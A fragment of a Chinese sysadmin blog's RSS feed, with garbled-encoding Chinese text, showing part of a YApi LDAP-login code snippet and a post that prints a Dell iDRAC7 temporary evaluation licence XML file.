&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   * @param &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;String&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; email emailåç§°ï¼Œä¸èƒ½ä¸ºç©º
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   * @param  &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;String&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; password å¯†ç ï¼Œä¸èƒ½ä¸ºç©º
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   * @returns &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;Object&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   *
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   */
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  async getLdapAuth&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ctx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; email, password &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ctx.request.body&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      //no const &lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; email.split&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/&lt;span class=&#34;se&#34;&gt;\@&lt;/span&gt;/g&lt;span class=&#34;o&#34;&gt;)[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      //1 const &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; info: ldapInfo &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; await ldap.ldapQuery&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;email, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      //2 const &lt;span class=&#34;nv&#34;&gt;emailPrefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; email.split&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/&lt;span class=&#34;se&#34;&gt;\@&lt;/span&gt;/g&lt;span class=&#34;o&#34;&gt;)[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      //3 const &lt;span class=&#34;nv&#34;&gt;emailPostfix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yapi.WEBCONFIG.ldapLogin.emailPostfix&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      //zrr
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;emailPrefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; email.split&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/&lt;span class=&#34;se&#34;&gt;\@&lt;/span&gt;/g&lt;span class=&#34;o&#34;&gt;)[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;emailPostfix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yapi.WEBCONFIG.ldapLogin.emailPostfix&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; info: ldapInfo &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; await ldap.ldapQuery&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;emailPostfix ? emailPrefix + emailPostfix : email&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      //zrr
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;emailParams&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ldapInfo&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;yapi.WEBCONFIG.ldapLogin.emailKey &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;mail&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;emailPostfix ? emailPrefix + emailPostfix : email&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ldapInfo&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;yapi.WEBCONFIG.ldapLogin.usernameKey&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; emailPrefix&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Dellå¾—Idracä¸´æ—¶license</title>
      <link>https://rendoumi.com/posts/20230406-dell_idrac/</link>
      <pubDate>Thu, 06 Apr 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230406-dell_idrac/</guid>
      <description>&lt;p&gt;æ–°å…¬å¸çš„dellæœåŠ¡å™¨idracå±…ç„¶æ²¡æœ‰licenseï¼Œæ— æ³•è¿œç¨‹ï¼Œæ‰¾äº†dellè¦äº†ä¸€ä¸ªä¸´æ—¶licenseç»™è£…ä¸Šï¼Œå…¶å®è£…å¥½ç³»ç»Ÿå°±ä¸ä¼šå¤ªç”¨åˆ°äº†ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä»¥åå¤‡ç”¨ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!--Copyright (c) 2010-2011 Dell Inc. All Rights Reserved.--&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:LicenseClass&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:ds=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2000/09/xmldsig#&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:lns=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.dell.com/2011/12G/licensing&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:LicenseData&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Schema&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Vendor=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Dell&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;iDRAC&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:maxDepth=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;255&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:SchemaVersion=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;2.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:TransferableLicense&amp;gt;&lt;/span&gt;false&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:TransferableLicense&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:UTCdateSold&amp;gt;&lt;/span&gt;2011-09-20T16:10:37Z&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:UTCdateSold&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:EntitlementID&amp;gt;&lt;/span&gt;56r8irR7fV5w3MIxlJUFL9Ph_Lori_Matthews&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:EntitlementID&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:DeviceClass&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;iDRAC&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:ProductDescription&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:lang_en&amp;gt;&lt;/span&gt;iDRAC7 Enterprise Evaluation License&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:lang_en&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:lang_es&amp;gt;&lt;/span&gt;iDRAC7 Enterprise Evaluation License&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:lang_es&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:lang_fr&amp;gt;&lt;/span&gt;iDRAC7 Enterprise Evaluation License&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:lang_fr&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:lang_de&amp;gt;&lt;/span&gt;iDRAC7 Enterprise Evaluation License&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:lang_de&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:lang_it&amp;gt;&lt;/span&gt;iDRAC7 Enterprise Evaluation License&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:lang_it&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:lang_ja&amp;gt;&lt;/span&gt;iDRAC7 Enterprise Evaluation License&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:lang_ja&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:lang_zh&amp;gt;&lt;/span&gt;iDRAC7 Enterprise Evaluation License&lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:lang_zh&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:ProductDescription&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:LicenseTerm&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Evaluation&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Duration=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;P30D&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:LicenseTerm&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:DeviceInfo&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:VendorID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;0x1912&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:DeviceID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;0x0011&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;License Management&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;RACADM&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;WSMAN&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SNMP&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Auto Discovery&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;6&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;USC Firmware Update&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;7&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Update Package&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;8&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;USC Operating System Deployment&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;9&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;USC Device Configuration&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;USC Diagnostics&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;11&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Power Budget&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;12&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Power Monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;13&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Virtual Media&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;14&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Telnet&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
